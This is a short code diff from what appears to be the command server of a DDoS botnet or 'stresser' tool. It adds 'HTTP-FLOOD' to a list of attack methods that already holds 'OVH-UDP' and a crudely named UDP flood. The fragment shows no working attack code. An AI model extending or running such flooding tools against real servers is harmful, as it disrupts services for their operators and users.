@@ -15,7 +15,7 @@ const SOCKET_HOST = "0.0.0.0"
  *  METHODS  *
  ************/
 
-const METHODS = ["OVH-UDP", "UDP-RAPE"]
+const METHODS = ["OVH-UDP", "UDP-RAPE", "HTTP-FLOOD"]
 
 var clients = []
 
